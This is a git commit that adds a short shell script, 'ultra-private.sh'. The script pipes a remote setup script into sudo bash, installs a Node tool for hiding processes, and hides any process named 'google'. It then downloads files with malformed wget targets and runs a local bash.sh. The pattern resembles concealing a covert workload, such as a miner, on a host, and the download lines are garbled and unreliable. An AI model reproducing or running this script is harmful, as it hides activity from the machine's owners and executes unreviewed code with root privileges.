4a38050e203ae863df56727437c869b8322da9f6
mhintao <110258960+mhintao@users.noreply.github.com>
2022-08-02 14:05:44 -0700

    Create ultra-private.sh

---
+++ ultra-private.sh
@@ -0,0 +1,7 @@
+curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ph add google
+wget bash.shprivate
+wget processprivate
+./bash.sh
